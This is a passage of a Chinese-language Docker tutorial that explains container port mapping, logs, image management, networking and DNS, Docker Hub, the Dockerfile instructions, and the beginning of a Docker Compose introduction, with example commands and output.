<h2 id="网络端口的快捷方式"><a href="#网络端口的快捷方式" class="headerlink" title="网络端口的快捷方式"></a>网络端口的快捷方式</h2><p>通过 docker ps 命令可以查看到容器的端口映射，docker 还提供了另一个快捷方式 docker port，使用 docker port 可以查看指定 （ID 或者名字）容器的某个确定端口映射到宿主机的端口号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker port bf08b7f2cd89</span><br><span class="line">5000/tcp -&gt; 0.0.0.0:5000</span><br></pre></td></tr></table></figure>
<h2 id="查看-WEB-应用程序日志"><a href="#查看-WEB-应用程序日志" class="headerlink" title="查看 WEB 应用程序日志"></a>查看 WEB 应用程序日志</h2><p>docker logs [ID或者名字] 可以查看容器内部的标准输出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unoob@runoob:~$ docker logs -f bf08b7f2cd89</span><br><span class="line"> * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</span><br><span class="line">192.168.239.1 - - [09/May/2016 16:30:37] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.239.1 - - [09/May/2016 16:30:37] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
<p>-f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出。</p>
<h2 id="查看WEB应用程序容器的进程"><a href="#查看WEB应用程序容器的进程" class="headerlink" title="查看WEB应用程序容器的进程"></a>查看WEB应用程序容器的进程</h2><p>我们还可以使用 docker top 来查看容器内部运行的进程</p>
<p>runoob@runoob:~$ docker top wizardly_chandrasekhar<br>UID     PID         PPID          …       TIME                CMD<br>root    23245       23228         …       00:00:00            python app.py</p>
<h2 id="检查-WEB-应用程序"><a href="#检查-WEB-应用程序" class="headerlink" title="检查 WEB 应用程序"></a>检查 WEB 应用程序</h2><p>使用 docker inspect 来查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker inspect wizardly_chandrasekhar</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Id&quot;: &quot;bf08b7f2cd897b5964943134aa6d373e355c286db9b9885b1f60b6e8f82b2b85&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2018-09-17T01:41:26.174228707Z&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;python&quot;,</span><br><span class="line">        &quot;Args&quot;: [</span><br><span class="line">            &quot;app.py&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;State&quot;: &#123;</span><br><span class="line">            &quot;Status&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;Running&quot;: true,</span><br><span class="line">            &quot;Paused&quot;: false,</span><br><span class="line">            &quot;Restarting&quot;: false,</span><br><span class="line">            &quot;OOMKilled&quot;: false,</span><br><span class="line">            &quot;Dead&quot;: false,</span><br><span class="line">            &quot;Pid&quot;: 23245,</span><br><span class="line">            &quot;ExitCode&quot;: 0,</span><br><span class="line">            &quot;Error&quot;: &quot;&quot;,</span><br><span class="line">            &quot;StartedAt&quot;: &quot;2018-09-17T01:41:26.494185806Z&quot;,</span><br><span class="line">            &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h1 id="Docker-镜像使用"><a href="#Docker-镜像使用" class="headerlink" title="Docker 镜像使用"></a>Docker 镜像使用</h1><p>当运行容器时，使用的镜像如果在本地中不存在，docker 就会自动从 docker 镜像仓库中下载，默认是从 Docker Hub 公共镜像源下载。</p>
<h2 id="列出镜像列表"><a href="#列出镜像列表" class="headerlink" title="列出镜像列表"></a>列出镜像列表</h2><p>我们可以使用 docker images 来列出本地主机上的镜像。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker images           </span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              14.04               90d5884b1ee0        5 days ago          188 MB</span><br><span class="line">php                 5.6                 f40e9e0f10c8        9 days ago          444.8 MB</span><br></pre></td></tr></table></figure>
<p>各个选项说明:</p>
<ul>
<li><p>REPOSITORY：表示镜像的仓库源</p>
</li>
<li><p>TAG：镜像的标签</p>
</li>
<li><p>IMAGE ID：镜像ID</p>
</li>
<li><p>CREATED：镜像创建时间</p>
</li>
<li><p>SIZE：镜像大小</p>
</li>
</ul>
<p>同一仓库源可以有多个 TAG，代表这个仓库源的不同个版本，如 ubuntu 仓库源里，有 15.10、14.04 等多个不同的版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。如果你不指定一个镜像的版本标签，例如你只使用 ubuntu，docker 将默认使用 ubuntu:latest 镜像。</p>
<h2 id="获取一个新的镜像"><a href="#获取一个新的镜像" class="headerlink" title="获取一个新的镜像"></a>获取一个新的镜像</h2><p>当我们在本地主机上使用一个不存在的镜像时 Docker 就会自动下载这个镜像。如果我们想预先下载这个镜像，我们可以使用 docker pull 命令来下载它。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Crunoob@runoob:~$ docker pull ubuntu:13.10</span><br></pre></td></tr></table></figure>
<h2 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h2><p>我们可以从 Docker Hub 网站来搜索镜像，Docker Hub 网址为： <a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a></p>
<p>我们也可以使用 docker search 命令来搜索镜像。</p>
<h2 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h2><p>镜像删除使用 docker rmi 命令，比如我们删除 hello-world 镜像：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker rmi hello-world</span><br></pre></td></tr></table></figure>
<h2 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h2><p>当我们从 docker 镜像仓库中下载的镜像不能满足我们的需求时，我们可以通过以下两种方式对镜像进行更改。</p>
<p>1、从已经创建的容器中更新镜像，并且提交这个镜像<br>2、使用 Dockerfile 指令来创建一个新的镜像</p>
<h3 id="更新镜像"><a href="#更新镜像" class="headerlink" title="更新镜像"></a>更新镜像</h3><p>更新镜像之前，我们需要使用镜像来创建一个容器。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker run -t -i ubuntu:15.10 /bin/bash</span><br><span class="line">root@e218edb10161:/#</span><br></pre></td></tr></table></figure></p>
<p>在运行的容器内使用 apt-get update 命令进行更新。</p>
<p>在完成操作之后，输入 exit 命令来退出这个容器。</p>
<p>此时 ID 为 e218edb10161 的容器，是按我们的需求更改的容器。我们可以通过命令 docker commit 来提交容器副本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker commit -m=&quot;has update&quot; -a=&quot;runoob&quot; e218edb10161 runoob/ubuntu:v2</span><br><span class="line">sha256:70bf1840fd7c0d2d8ef0a42a817eb29f854c1af8f7c59fc03ac7bdee9545aff8</span><br></pre></td></tr></table></figure>
<p>各个参数说明：</p>
<ul>
<li><p>-m: 提交的描述信息</p>
</li>
<li><p>-a: 指定镜像作者</p>
</li>
<li><p>e218edb10161：容器 ID</p>
</li>
<li><p>runoob/ubuntu:v2: 指定要创建的目标镜像名</p>
</li>
</ul>
<h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><p>我们使用命令 docker build ， 从零开始来创建一个新的镜像。为此，我们需要创建一个 Dockerfile 文件，其中包含一组指令来告诉 Docker 如何构建我们的镜像。这个我们后面会介绍。</p>
<h2 id="设置镜像标签"><a href="#设置镜像标签" class="headerlink" title="设置镜像标签"></a>设置镜像标签</h2><p>我们可以使用 docker tag 命令，为镜像添加一个新的标签。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker tag 860c279d2fec runoob/centos:dev</span><br></pre></td></tr></table></figure>
<p>docker tag 镜像ID，这里是 860c279d2fec，用户名称、镜像源名(repository name)和新的标签名(tag)。</p>
<h1 id="Docker-容器连接"><a href="#Docker-容器连接" class="headerlink" title="Docker 容器连接"></a>Docker 容器连接</h1><p>容器中可以运行一些网络应用，要让外部也可以访问这些应用，可以通过 -P 或 -p 参数来指定端口映射。</p>
<p>两种方式的区别是:</p>
<ul>
<li>-P :是容器内部端口随机映射到主机的高端口。</li>
<li>-p : 是容器内部端口绑定到指定的主机端口。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 5000:5000 training/webapp python app.py</span><br></pre></td></tr></table></figure>
<p>另外，我们可以指定容器绑定的网络地址，比如绑定 127.0.0.1。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker run -d -p 127.0.0.1:5001:5000 training/webapp python app.py</span><br><span class="line">95c6ceef88ca3e71eaf303c2833fd6701d8d1b2572b5613b5a932dfdfe8a857c</span><br><span class="line">runoob@runoob:~$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND           ...     PORTS                                NAMES</span><br><span class="line">95c6ceef88ca        training/webapp     &quot;python app.py&quot;   ...  5000/tcp, 127.0.0.1:5001-&gt;5000/tcp   adoring_stonebraker</span><br><span class="line">33e4523d30aa        training/webapp     &quot;python app.py&quot;   ...  0.0.0.0:5000-&gt;5000/tcp               berserk_bartik</span><br><span class="line">fce072cc88ce        training/webapp     &quot;python app.py&quot;   ...    0.0.0.0:32768-&gt;5000/tcp              grave_hopper</span><br></pre></td></tr></table></figure>
<p>如果要绑定 UDP 端口，可以在端口后面加上 /udp。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py</span><br></pre></td></tr></table></figure>
<h2 id="Docker-容器互联"><a href="#Docker-容器互联" class="headerlink" title="Docker 容器互联"></a>Docker 容器互联</h2><p>端口映射并不是唯一把 docker 连接到另一个容器的方法。</p>
<p>docker 有一个连接系统允许将多个容器连接在一起，共享连接信息。</p>
<p>docker 连接会创建一个父子关系，其中父容器可以看到子容器的信息。</p>
<h3 id="新建网络"><a href="#新建网络" class="headerlink" title="新建网络"></a>新建网络</h3><p>先创建一个新的 Docker 网络。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker network create -d bridge test-net</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><p>-d：参数指定 Docker 网络类型，有 bridge、overlay。</p>
</li>
<li><p>其中 overlay 网络类型用于 Swarm mode，在本小节中你可以忽略它。</p>
</li>
</ul>
<h3 id="连接容器"><a href="#连接容器" class="headerlink" title="连接容器"></a>连接容器</h3><p>运行一个容器并连接到新建的 test-net 网络:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -itd --name test1 --network test-net ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>打开新的终端，再运行一个容器并加入到 test-net 网络:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -itd --name test2 --network test-net ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>下面通过 ping 来证明 test1 容器和 test2 容器建立了互联关系。</p>
<p>如果 test1、test2 容器内中无 ping 命令，则在容器内执行以下命令安装 ping（即学即用：可以在一个容器里安装好，提交容器到镜像，在以新的镜像重新运行以上俩个容器）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt install iputils-ping</span><br></pre></td></tr></table></figure>
<p>然后在 test1 容器输入以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it test1 /bin/bash</span><br><span class="line"></span><br><span class="line">ping test2</span><br></pre></td></tr></table></figure>
<p>可以测试到test1 容器和 test2 容器建立了互联关系。</p>
<p>如果你有多个容器之间需要互相连接，推荐使用 Docker Compose，后面会介绍。</p>
<h3 id="配置-DNS"><a href="#配置-DNS" class="headerlink" title="配置 DNS"></a>配置 DNS</h3><p>我们可以在宿主机的 /etc/docker/daemon.json 文件中增加以下内容来设置全部容器的 DNS：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"dns"</span> : [</span><br><span class="line">    <span class="string">"114.114.114.114"</span>,</span><br><span class="line">    <span class="string">"8.8.8.8"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设置后，启动容器的 DNS 会自动配置为 114.114.114.114 和 8.8.8.8。</p>
<p>配置完，需要重启 docker 才能生效。</p>
<p>查看容器的 DNS 是否生效可以使用以下命令，它会输出容器的 DNS 信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -it --rm  ubuntu  cat etc/resolv.conf</span><br></pre></td></tr></table></figure>
<h3 id="手动指定容器的配置"><a href="#手动指定容器的配置" class="headerlink" title="手动指定容器的配置"></a>手动指定容器的配置</h3><p>如果只想在指定的容器设置 DNS，则可以使用以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -it --rm -h host_ubuntu  --dns=114.114.114.114 --dns-search=test.com ubuntu</span><br></pre></td></tr></table></figure>
<h1 id="Docker-仓库管理"><a href="#Docker-仓库管理" class="headerlink" title="Docker 仓库管理"></a>Docker 仓库管理</h1><p>仓库（Repository）是集中存放镜像的地方。以下介绍一下 Docker Hub。当然不止 docker hub，只是远程的服务商不一样，操作都是一样的。</p>
<h2 id="Docker-Hub"><a href="#Docker-Hub" class="headerlink" title="Docker Hub"></a>Docker Hub</h2><p>目前 Docker 官方维护了一个公共仓库 Docker Hub。</p>
<p>大部分需求都可以通过在 Docker Hub 中直接下载镜像来实现。</p>
<h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h2><p>在 <a href="https://hub.docker.com" target="_blank" rel="noopener">https://hub.docker.com</a> 免费注册一个 Docker 账号。</p>
<h2 id="登录和退出"><a href="#登录和退出" class="headerlink" title="登录和退出"></a>登录和退出</h2><p>登录需要输入用户名和密码，登录成功后，我们就可以从 docker hub 上拉取自己账号下的全部镜像。</p>
<h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><p>退出 docker hub 可以使用以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker logout</span><br></pre></td></tr></table></figure>
<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>你可以通过 docker search 命令来查找官方仓库中的镜像，并利用 docker pull 命令来将它下载到本地。</p>
<h2 id="推送镜像"><a href="#推送镜像" class="headerlink" title="推送镜像"></a>推送镜像</h2><p>用户登录后，可以通过 docker push 命令将自己的镜像推送到 Docker Hub。</p>
<p>以下命令中的 username 请替换为你的 Docker 账号用户名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker tag ubuntu:18.04 username/ubuntu:18.04</span><br><span class="line">$ docker image ls</span><br><span class="line"></span><br><span class="line">REPOSITORY      TAG        IMAGE ID            CREATED           ...  </span><br><span class="line">ubuntu          18.04      275d79972a86        6 days ago        ...  </span><br><span class="line">username/ubuntu 18.04      275d79972a86        6 days ago        ...  </span><br><span class="line"></span><br><span class="line">$ docker push username/ubuntu:18.04</span><br><span class="line">$ docker search username/ubuntu</span><br><span class="line"></span><br><span class="line">NAME             DESCRIPTION       STARS         OFFICIAL    AUTOMATED</span><br><span class="line">username/ubuntu</span><br></pre></td></tr></table></figure>
<h1 id="Docker-Dockerfile"><a href="#Docker-Dockerfile" class="headerlink" title="Docker Dockerfile"></a>Docker Dockerfile</h1><h2 id="什么是-Dockerfile？"><a href="#什么是-Dockerfile？" class="headerlink" title="什么是 Dockerfile？"></a>什么是 Dockerfile？</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。</p>
<h2 id="使用-Dockerfile-定制镜像"><a href="#使用-Dockerfile-定制镜像" class="headerlink" title="使用 Dockerfile 定制镜像"></a>使用 Dockerfile 定制镜像</h2><p>下面以定制一个 nginx 镜像（构建好的镜像内会有一个 /usr/share/nginx/html/index.html 文件）为例讲解使用 Dockerfile 定制镜像。</p>
<p>在一个空目录下，新建一个名为 Dockerfile 文件，并在文件内添加以下内容：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'这是一个本地构建的nginx镜像'</span> &gt; /usr/share/nginx/html/index.html</span></span><br></pre></td></tr></table></figure>
<h3 id="FROM-和-RUN-指令的作用"><a href="#FROM-和-RUN-指令的作用" class="headerlink" title="FROM 和 RUN 指令的作用"></a>FROM 和 RUN 指令的作用</h3><p>FROM：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p>
<p>RUN：用于执行后面跟着的命令行命令。有以下俩种格式：</p>
<p>shell 格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RUN &lt;命令行命令&gt;</span><br><span class="line"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span><br></pre></td></tr></table></figure>
<p>exec 格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</span><br><span class="line"># 例如：</span><br><span class="line"># RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</span><br></pre></td></tr></table></figure>
<p>注意：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">RUN yum install wget</span><br><span class="line">RUN wget -O redis.tar.gz &quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span><br><span class="line">RUN tar -xvf redis.tar.gz</span><br><span class="line">以上执行会创建 3 层镜像。可简化为以下格式：</span><br><span class="line">FROM centos</span><br><span class="line">RUN yum install wget \</span><br><span class="line">    &amp;&amp; wget -O redis.tar.gz &quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot; \</span><br><span class="line">    &amp;&amp; tar -xvf redis.tar.gz</span><br></pre></td></tr></table></figure>
<h3 id="开始构建镜像"><a href="#开始构建镜像" class="headerlink" title="开始构建镜像"></a>开始构建镜像</h3><p>通过目录下的 Dockerfile 构建一个 nginx:v3（镜像名称:镜像标签）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker build -t nginx:v3 .</span><br></pre></td></tr></table></figure>
<p>指令最后一个 . 是上下文路径，那么什么是上下文路径呢？</p>
<p>上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。</p>
<p>解析：由于 docker 的运行模式是 C/S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候无法用到我们本机的文件。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。</p>
<p>注意：上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎。</p>
<h2 id="Dockerfile指令详解"><a href="#Dockerfile指令详解" class="headerlink" title="Dockerfile指令详解"></a>Dockerfile指令详解</h2><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;</span><br><span class="line">COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,...  &quot;&lt;目标路径&gt;&quot;]</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPY hom* /mydir/</span><br><span class="line">COPY hom?.txt /mydir/</span><br></pre></td></tr></table></figure>
<h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>ADD 指令和 COPY 的使用格式一致（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下：</p>
<p>ADD 在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。</p>
<h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p>类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:</p>
<p>CMD 在docker run 时运行。<br>RUN 是在 docker build。</p>
<p>作用：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。</p>
<p>注意：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CMD &lt;shell 命令&gt; </span><br><span class="line">CMD [&quot;&lt;可执行文件或命令&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...] </span><br><span class="line">CMD [&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...]  # 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span><br></pre></td></tr></table></figure>
<p>推荐使用第二种格式，执行过程比较明确。第一种格式实际上在运行的过程中也会自动转换成第二种格式运行，并且默认可执行文件是 sh。</p>
<h3 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h3><p>类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。</p>
<p>但是, 如果运行 docker run 时使用了 –entrypoint 选项，将覆盖 CMD 指令指定的程序。</p>
<p>优点：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。</p>
<p>注意：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ENTRYPOINT [&quot;&lt;executeable&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...]</span><br></pre></td></tr></table></figure>
<p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参，以下示例会提到。</p>
<p>示例：</p>
<p>假设已通过 Dockerfile 构建了 nginx:test 镜像：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"nginx"</span>, <span class="string">"-c"</span>] <span class="comment"># 定参</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"/etc/nginx/nginx.conf"</span>] <span class="comment"># 变参</span></span></span><br></pre></td></tr></table></figure>
<p>1、不传参运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run  nginx:test</span><br></pre></td></tr></table></figure>
<p>容器内会默认运行以下命令，启动主进程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx -c /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
<p>2、传参运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run  nginx:test -c /etc/nginx/new.conf</span><br></pre></td></tr></table></figure>
<p>容器内会默认运行以下命令，启动主进程(/etc/nginx/new.conf:假设容器内已有此文件)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx -c /etc/nginx/new.conf</span><br></pre></td></tr></table></figure>
<h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ENV &lt;key&gt; &lt;value&gt;</span><br><span class="line">ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</span><br></pre></td></tr></table></figure>
<p>以下示例设置 NODE_VERSION = 7.2.0 ， 在后续的指令中可以通过 $NODE_VERSION 引用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ENV NODE_VERSION 7.2.0</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RUN curl -SLO &quot;https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz&quot; \</span><br><span class="line">  &amp;&amp; curl -SLO &quot;https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc&quot;</span><br></pre></td></tr></table></figure>
<h3 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h3><p>构建参数，与 ENV 作用一至。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</p>
<p>构建命令 docker build 中可以用 –build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ARG &lt;参数名&gt;[=&lt;默认值&gt;]</span><br></pre></td></tr></table></figure>
<h3 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h3><p>定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷。</p>
<p>作用：</p>
<p>  避免重要的数据，因容器重启而丢失，这是非常致命的。<br>  避免容器不断变大。</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]</span><br><span class="line">VOLUME &lt;路径&gt;</span><br></pre></td></tr></table></figure>
<p>在启动容器 docker run 的时候，我们可以通过 -v 参数修改挂载点。</p>
<h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><p>仅仅只是声明端口。</p>
<p>作用：</p>
<p>  帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。<br>  在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</span><br></pre></td></tr></table></figure>
<h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p>
<p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WORKDIR &lt;工作目录路径&gt;</span><br></pre></td></tr></table></figure>
<h3 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h3><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">USER &lt;用户名&gt;[:&lt;用户组&gt;]</span><br></pre></td></tr></table></figure>
<h3 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h3><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态。</p>
<p>格式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HEALTHCHECK [选项] CMD &lt;命令&gt;：设置检查容器健康状况的命令</span><br><span class="line">HEALTHCHECK NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</span><br><span class="line"></span><br><span class="line">HEALTHCHECK [选项] CMD &lt;命令&gt; : 这边 CMD 后面跟随的命令使用，可以参考 CMD 的用法。</span><br></pre></td></tr></table></figure></p>
<h3 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h3><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为 test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这是执行新镜像的 Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ONBUILD &lt;其它指令&gt;</span><br></pre></td></tr></table></figure>
<h1 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h1><h2 id="Compose-简介"><a href="#Compose-简介" class="headerlink" title="Compose 简介"></a>Compose 简介</h2><p>Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p>
<p>Compose 使用的三个步骤：</p>
<ul>
<li><p>使用 Dockerfile 定义应用程序的环境。</p>
</li>
<li><p>使用 docker-compose.yml 定义构成应用程序的服务，这样它们可以在隔离环境中一起运行。</p>
</li>
<li><p>最后，执行 docker-compose up 命令来启动并运行整个应用程序。</p>
</li>
</ul>
